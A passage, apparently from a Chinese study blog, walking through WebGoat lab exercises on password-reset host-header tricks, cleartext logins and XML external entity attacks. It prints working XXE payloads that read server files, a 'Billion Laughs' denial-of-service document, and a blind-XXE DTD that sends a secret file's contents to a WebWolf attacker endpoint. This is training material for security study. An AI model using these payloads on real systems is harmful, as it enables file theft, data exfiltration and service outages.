class="line">http://localhost:8081/WebGoat/PasswordReset/reset/reset-password/2ad9c8c3-0cdc-4927-950f-ab348005dc4a</span><br></pre></td></tr></table></figure><p>后面应该是用户id，然后主要是<strong>因为重置链接不变且永久有效导致的问题</strong>，我们只需要把后面的id换成tom的字符串就行了</p><p>但是如何获取Tom呢</p><p>我们可以向tom邮箱发送重置链接的信，虽然这样可以生成tom的字符串，但是我们不能登录tom的邮箱</p><p>所以我们可以在向tom邮箱发送重置链接的信抓包，然后修改host:localhost:8080为9090,这样的话是请求经过WebWolf</p><blockquote><p>在数据包中，host表示接收这个请求的目的地的host，仅包括域名和端口号。例如，<a href="http://test.pay.com:8090">test.pay.com:8090</a>。它是一个用于指定被请求资源的Internet主机和端口号的数据包头字段。</p></blockquote><p>然后去webWolf的incoming request模块可以看到请求（最新消息在最下面）</p><p>发现tom的字符串，替换重置密码链接后面的id就行了</p><h3 id="4-Secure-Passwords">4.Secure Passwords</h3><p>大部分都在讲如何构建一个安全的密码</p><h4 id="4-6">4.</h4><p>这个挺有意思的，可以知道你的密码强度（顺带一提测试博主的密码在不到2个月的时间就被爆破了。。。）</p><p>换了个强度高的密码需要100多年才能爆破（嘻嘻😏）</p><h2 id="5-Sensitive-Data-Exposure">5.Sensitive Data Exposure</h2><h3 id="1-Insecure-Login">1.Insecure Login</h3><p>不安全的登录</p><h4 id="2-7">2.</h4><p>其实就是模拟我们是中间人</p><p>被攻击人在登录时，我们截获数据包，可以看到用户名和密码明文传输</p><p>相当于就是不安全的登录</p><h2 id="6-XML-External-Entities（XXE）">6.XML External Entities（XXE）</h2><p>本 节 课 讲 授 了 如何 执行 XML 外部 实体 攻击 ， 以及如何 滥用 和 防范 它。</p><h3 id="0-基本概念">0 基本概念</h3><blockquote><p><a href="https://bbs.huaweicloud.com/blogs/412746?utm_source=zhihu&amp;utm_medium=bbs-ex&amp;utm_campaign=other&amp;utm_content=content">【安全攻防】深入浅出实战系列专题-XXE攻击-云社区-华为云 (huaweicloud.com)</a></p><p><a href="https://www.cnblogs.com/websecurity-study/p/11348913.html">WEB安全——XML注入 - 灰羽· - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/yang1234567898/article/details/122484013">（渗透学习）XXE漏洞原理 &amp; 挖掘 &amp; 利用 &amp; 防御_xxe漏洞挖掘-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_45836474/article/details/107573925">XXE漏洞基础及简单利用_xxe漏洞的利用方法-CSDN博客</a></p><p>（这个写的很详细）<a href="https://xz.aliyun.com/t/6887">从XML相关一步一步到XXE漏洞 - 先知社区 (aliyun.com)</a></p></blockquote><p>下面是我做的一些总结（不缺时间还是多看看别的大佬写的吧，本蒟蒻只能总结一些大佬的话😭）</p><h4 id="0-XML基础"><strong>0.XML基础</strong></h4><p>XML 指可扩展标记语言（Extensible Markup Language)，是一种与HTML类似的纯文本的标记语言，设计宗旨是为了传输数据，而非显示数据。是W3C的推荐标准。</p><blockquote><p>xml和html结构类似，不同的是：</p><ol><li><strong>XML 被设计用来传输和存储数据。</strong></li><li><strong>HTML 被设计用来显示数据。</strong></li></ol><p><strong>XML 文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</strong>（在下面DTD给的实例代码中强调了）</p></blockquote><h4 id="1-XML标签"><strong>1.XML标签</strong></h4><p>XML被设计为具有自我描述性，XML标签是没有被预定义的，需要自行定义标签与文档结构。如下为包含了标题、发送者、接受者、内容等信息的xml文档。</p><p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：</p><ul><li>元素</li><li>属性</li><li>实体</li><li>PCDATA</li><li>CDATA</li></ul><h5 id="1-每个构建模块的简要描述">1.每个构建模块的简要描述</h5><h6 id="1-元素"><strong>1. 元素</strong></h6><p>元素是 XML 以及 HTML 文档的主要构建模块，元素可包含文本、其他元素或者是空的。实例:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;body text <span class="keyword">in</span> between&lt;/body&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">message</span>&gt;</span>some message in between<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>空的 HTML 元素的例子是 “hr”、“br” 以及 “img”。</p><h6 id="2-属性"><strong>2. 属性</strong></h6><p>属性可提供有关元素的额外信息 实例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;computer.gif&quot;</span> /&gt;</span><br></pre></td></tr></table></figure><h6 id="3-实体"><strong>3. 实体</strong></h6><p>实体是用来定义普通文本的变量。实体引用是对实体的引用。</p><h6 id="4-PCDATA"><strong>4. PCDATA</strong></h6><p>PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。<br>被解析的字符数据不应当包含任何<code>&amp;</code>，<code>&lt;</code>，或者<code>&gt;</code>字符，需要用<code>&amp;</code> <code>&lt;</code> <code>&gt;</code>实体来分别替换。</p><h6 id="5-CDATA"><strong>5. CDATA</strong></h6><p>CDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p><h5 id="2-XML语法规则"><strong>2.XML语法规则</strong></h5><blockquote><ul><li><p>XML文档必须有一个根元素</p></li><li><p>区分大小写</p><p>在标记中必须注意区分大小写，在XML中，<code>&lt;TEST&gt;</code>和<code>&lt;test&gt;</code>是两个截然不同的标记</p></li><li><p>要有正确的结束标记，即必须要有一个闭合标签</p><p>结束标记除了要和开始编辑在拼写和大小上完全相同，还必须在前面加上一个斜杠“/”</p><p>若开始标记<code>&lt;test&gt;</code>，结束标记则为<code>&lt;/test&gt;</code>。XML严格要求标记配对，HTML中的<code>&lt;br&gt;</code>、<code>&lt;hr&gt;</code>的元素形式在XML中是不合法的。当一对标记之间没有任何文本内容时，可以不写结束标记，在开始标记的末尾加上斜杠”/”来确认，例如：<code>&lt;test /&gt; </code>这样的标记被称为“空标记”。</p></li><li><p>标记要正确嵌套</p><p>在一个XML元素中允许包含其他XML元素，但这些元素之间必须满足嵌套性</p></li><li><p>有效使用属性，属性值必须加引号</p><p>标记中可以包含任意多个属性。在标记中，属性以名称/取值对出现，属性名不能重复，名称与取值之间用等号“=”分隔，且取值用引号引起来。</p><p>举个例子：&lt;衣服 品牌=“耐克” 类型=“T恤” &gt;</p></li><li><p>XML中空格会被保留</p></li><li><p>实体引用</p></li></ul></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span> <span class="comment">&lt;!-- 标题（根元素） --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-DTD"><strong>2.DTD</strong></h4><p>指文档类型定义(Document Type Definition)，通过定义根节点、元素（ELEMENT）、属性（ATTLIST）、实体（ENTITY）等约束了xml文档的内容按照指定的格式承载数据。</p><p>简单来说就是DTD可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。</p><p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。（所以说是可选~~）</p><p><strong>① 内部的 DOCTYPE 声明：</strong></p><p>格式为：<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--XML 声明--&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!--文档类型定义--&gt;</span><br><span class="line">&lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--定义 note 元素有四个元素--&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt; &lt;!--定义 to 元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt; &lt;!--定义 from 元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT head (#PCDATA)&gt; &lt;!--定义 head 元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt; &lt;!--定义 body 元素为”#PCDATA”类型--&gt;</span><br><span class="line">]]]&gt;</span><br><span class="line">&lt;!--文档元素--&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Dave&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Tom&lt;/from&gt;</span><br><span class="line">&lt;head&gt;Reminder&lt;/head&gt;</span><br><span class="line">&lt;body&gt;You are a good man&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><blockquote><p>#PCDATA是XML约束文档中的一个概念，用于表示元素的内容是可解析的字符数据。在XML中，#PCDATA用于表示元素中包含的文本内容，它不能包含任何子元素。与CDATA不同，#PCDATA可以包含字符串、子元素和字符串与子元素的组合。在XML约束文档中，如DTD（Document Type Definition）类型约束文档，#PCDATA用于指定元素的内容或属性的取值范围等。</p></blockquote><p><strong>② 外部引用：</strong></p><p>格式为：<code>&lt;!DOCTYPE 根元素 SYSTEM ” 文件名 ”&gt; </code></p><p>如下xml代码引用了外部DTD，文件为“note.dtd”</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;note.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>note.dtd：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><h4 id="3-实体-2">3.实体</h4><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p><ul><li>实体引用是对实体的引用。</li><li>实体可在内部或外部进行声明。</li></ul><p>简单来说：在DTD中通过<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code>等方式定义实体，相当于定义变量的作用，可在文档内容中通过<code>&amp;实体名称；</code>的方式引用实体的值（变量的值）。</p><p>说一个很实际的例子</p><blockquote><p>XML元素以形如 <code>&lt;tag&gt;foo&lt;/tag&gt;</code> 的标签开始和结束，如果元素内部出现如<code>&lt;</code> 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义五个实体引用，即用<code>&lt; &gt; &amp; ' &quot;</code> 替换 <code>&lt; &gt; &amp; ' &quot;</code> 。<br>实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。</p></blockquote><p>注意别搞混<code>&lt;!ENTITY</code> 和 <code>&lt;!ELEMENT</code></p><blockquote><p><code>&lt;!ENTITY</code> 用于定义实体引用，而 <code>&lt;!ELEMENT</code> 用于定义元素的结构和内容。实体引用通常用于引用外部资源，而元素定义则用于指定元素的结构和内容规则。</p></blockquote><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/xxe/1.png" alt=""></p><p>然后这是webgoat的解释：</p><p>一旦XML文档被解析器处理，它将用定义的常量“Jo Smith”替换定义的实体</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/xxe/2.png" alt=""></p><p>Java应用程序中，XML可用于将数据从客户端获取到服务器，我们都熟悉JSON API，我们也可以使用XML来获取信息。大多数情况下，框架会根据 xml 结构自动填充 Java 对象，例如</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/xxe/3.png" alt=""></p><p><strong>实体类型</strong>:实体分为多种类型，从使用范围的维度，分为参数实体（只能在DTD中引用）与非参数实体（可以在DTD中、文档内容中引用）。区别如下：</p><table><thead><tr><th></th><th>样例</th><th>引用方式</th><th>使用范围与场景</th></tr></thead><tbody><tr><td>非参数实体</td><td><code>&lt;!ENTITY country &quot;中国&quot;&gt;</code></td><td>&amp;country;</td><td>在DTD中、文档内容中均可引用，一般用来取代重复的字符串</td></tr><tr><td>参数实体</td><td><code>&lt;!ENTITY % countrydefine &quot;xxx元素的DTD定义内容&quot;&gt;</code></td><td>%country;</td><td>仅能在DTD定义中引用，一般用来保存某段重复的DTD定义</td></tr></tbody></table><p>从值的来源维度，分为内部实体、外部实体。内部实体为文档内部直接定义值，外部实体为通过http、file等协议从文件外的某处获取内容作为实体的值。区别如下：</p><table><thead><tr><th></th><th>样例</th><th>特征与使用场景</th></tr></thead><tbody><tr><td>内部实体</td><td><code>&lt;!ENTITY country &quot;中国&quot;&gt;</code></td><td>值是明确的字符串常量等，可以直接定义在本文档中</td></tr><tr><td>外部实体</td><td><code>&lt;!ENTITY country SYSTEM &quot;file:///D:/country.txt&quot;&gt;</code></td><td>值来源于其它文件或者网络</td></tr></tbody></table><h4 id="4-XML外部实体注入"><strong>4.XML外部实体注入</strong></h4><p>XML External Entity Injection即xml外部实体注入漏洞，简称XXE漏洞。当xml解析器支持对于外部实体的解析且待解析的xml文件可由外部控制时，就会发生此攻击。攻击者可以通过构造外部实体的内容为本地其它目录下的文件、访问内网/外网的制定url等方式实现自己的攻击目的，达到信息泄露、命令执行、拒绝服务、SSRF、内网端口扫描等攻击目的。</p><h3 id="1-3">1-3</h3><p>建议看完上面的基本概念，再看一遍webgoat的，可以有更多理解</p><p>引用一位博主的话</p><p>下面是XXE注入的粗略理解（确实粗略易懂）</p><blockquote><p>XML声明，一般没啥，约束而已，都会写上</p><p>版本编码<?xml version="1.0" encoding="UTF-8"?> 文档类型定义(DTD)</p><p>重点在这！<strong>可以引用内部外部的实体</strong></p><p>如：<code>&lt;!ENTITY % name SYSTEM “file:///etc/passwd&quot;&gt;%name;</code>引用了不就调用了，是不是有点类似文件包含？这个实际上就是把“file:///etc/passwd”赋值给name，那如果<code>file:///etc/passwd</code>用户可控呢？改成http协议呢？没听懂，再解释一遍吧</p><p>XML外部实体 ‘name’ 被赋予的值为：file://etc/passwd。在解析XML文档的过程中，实体’ name’的值会被替换为URI(file://etc/passwd)内容值（也就是passwd文件的内容）。 关键字’SYSTEM’会告诉XML解析器，’ name’实体的值将从其后的URI中读取，并把读取的内容替换name出现的地方。假如 SYSTEM 后面的内容可以被用户控制，那么用户就可以随意替换为其他内容，从而读取服务器本地文件（file:///etc/passwd)或者远程文件（<code>http://www.baidu.com/zzyy.txt）</code>]&gt; &lt;元素名称 category=“属性”&gt;文本或其他元素&lt;/元素名称&gt;</p><p>总结一下：XXE注入，即XML External Entity，XML外部实体注入。通过 XML 实体，”SYSTEM”关键词导致 XML 解析器可以从本地文件或者远程 URI 中读取数据。所以攻击者可以通过 XML 实体传递自己构造的恶意值，是处理程序解析它。当引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p><p>ENTITY 实体，在一个甚至多个XML文档中频繁使用某一条数据，我们可以预先定义一个这条数据的“别名”，即一个ENTITY，然后在这些文档中需要该数据的地方调用它。</p><p>原文链接：<a href="https://blog.csdn.net/zy15667076526/article/details/109560492">https://blog.csdn.net/zy15667076526/article/details/109560492</a></p></blockquote><h3 id="4-7">4.</h3><p>在此作业中，您将为照片添加注释，在提交表单时尝试执行 XXE 使用注释字段进行注入。尝试列出文件系统的根目录。</p><p>先抓包看看</p><p>你可以看发送的数据包携带的数据是xml,说明用户可控</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;comment&gt;&lt;text&gt;666&lt;/text&gt;&lt;/comment&gt;</span><br></pre></td></tr></table></figure><p>添加payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE any[</span><br><span class="line">&lt;!ENTITY flag SYSTEM &#x27;file:///C:/&#x27;&gt; </span><br><span class="line">&lt;!-- file:// 表示这是一个文件协议的URL，/C:/ 表示C盘的根目录。--&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;comment&gt;&lt;text&gt;</span><br><span class="line">&amp;flag;</span><br><span class="line">&lt;/text&gt;&lt;/comment&gt;</span><br></pre></td></tr></table></figure><p>就可以看到flag了，并且评论区也有返回的数据</p><h3 id="5-6">5-6</h3><p>5是指导你攻击的，6是代码审计角度发现XXE</p><p><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"> XXE prevention sheet</a></p><h3 id="7-4">7</h3><p>在现代REST框架中，服务器可能能够接受您作为开发人员没有想到的数据格式。因此，这可能会导致 JSON 端点容易受到 XXE 攻击。</p><p>同样是相同的练习，但尝试执行与第一次赋值相同的 XML 注入。</p><p>这里我们同样是发送评论抓包</p><p>发现<code>Content-Type:application/json</code>，即json模式的</p><p>但是根据提示没有只接收json文件，这里直接换成<code>application/xml</code>就行了</p><p>把下面的数据部分换成</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">any</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">flag</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///C:/&#x27;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span><span class="tag">&lt;<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;flag;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="8-3">8.</h3><p>对第7题的解释</p><h3 id="9-3">9.</h3><p>这个挺有意思的，利用XXE进行DOS攻击</p><p>案例</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">lolz</span> [</span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol</span> <span class="string">&quot;lol&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ELEMENT <span class="keyword">lolz</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol1</span> <span class="string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol2</span> <span class="string">&quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol3</span> <span class="string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol4</span> <span class="string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol5</span> <span class="string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol6</span> <span class="string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol7</span> <span class="string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol8</span> <span class="string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol9</span> <span class="string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当 XML 解析器加载此文档时，它会看到它包含一个根元素“lolz”，其中包含文本“&amp;lol9;”。但是，“&amp;lol9;”是一个已定义的实体，它扩展为包含十个“&amp;lol8;”字符串的字符串。每个“&amp;lol8;”字符串都是一个定义的实体，可扩展为十个“&amp;lol7;”字符串，依此类推。在处理完所有实体扩展后，这个小的 （&lt; 1 KB） XML 块实际上将占用近 3 GB 的内存。</p><p>这被称为&quot;Billion laughs&quot;</p><p><a href="https://en.wikipedia.org/wiki/Billion_laughs">维基百科（需要梯子）</a></p><h3 id="10-4">10.</h3><p>展示了如何通过 Blind XXE 攻击 ping 服务器</p><p>11就是实操</p><h3 id="11-3">11.</h3><p>根据题意，盗取 目标服务器上的</p><p><code>C:\Users\nonevector/.webgoat-8.2.2//XXE/secret.txt</code></p><p>提示我们可以尝试使用 WebWolf 的landing页面上传此文件：<a href="http://localhost:9090/landing">http://localhost:9090/landing</a></p><p>WebGoat是当前论坛服务器，里面有我们的目标文件secret.txt<br>WebWolf是入侵者的服务器，托管了一个attack.dtd攻击文件</p><p>流程：<br>入侵者进入被害者的论坛，发送信息同时用Burp拦截请求，修改自己的评论内容使其远程链接到入侵者的WebWolf网站的attack.dtd文件，attack.dtd文件读取了被害者服务器中的文件信息，被害者服务器将该私密信息返回到论坛中并显示在网页上。</p><p>创建attack.dtd文件</p><blockquote><p>注意需要获取的文件换成你的</p></blockquote><p>file用于获取目标服务器上的文件</p><p>print用于发送到webwolf，这个请求会被拦截</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///C:\Users\nonevector/.webgoat-8.2.2//XXE/secret.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % print &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://localhost:9090/landing?text=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">&lt;!-- &amp;#37; 是一个字符实体引用，代表百分号（%）。确保了百分号不会被误解为XML标记的一部分。 --&gt;</span><br></pre></td></tr></table></figure><p>然后随便发送评论burp抓包,在结尾加上payload ，注意下面的url中的username换成你的，attack.dtd文件名也不能出错</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost:9090/files/username/attack.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">%print;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span>  <span class="tag">&lt;<span class="name">text</span>&gt;</span>cute<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure><p>去webwolf看收到的数据(url后面的text)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;timestamp&quot; : &quot;2024-01-05T09:03:11.930091100Z&quot;,</span><br><span class="line">  &quot;principal&quot; : null,</span><br><span class="line">  &quot;session&quot; : null,</span><br><span class="line">  &quot;request&quot; : &#123;</span><br><span class="line">    &quot;method&quot; : &quot;GET&quot;,</span><br><span class="line">    &quot;uri&quot; : &quot;http://localhost:9090/landing?text=WebGoat%208.0%20rocks...%20(AgzOeuyeHm)&quot;,</span><br><span class="line">    &quot;headers&quot; : &#123;</span><br><span class="line">      &quot;Accept&quot; : [ &quot;text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2&quot; ],</span><br><span class="line">      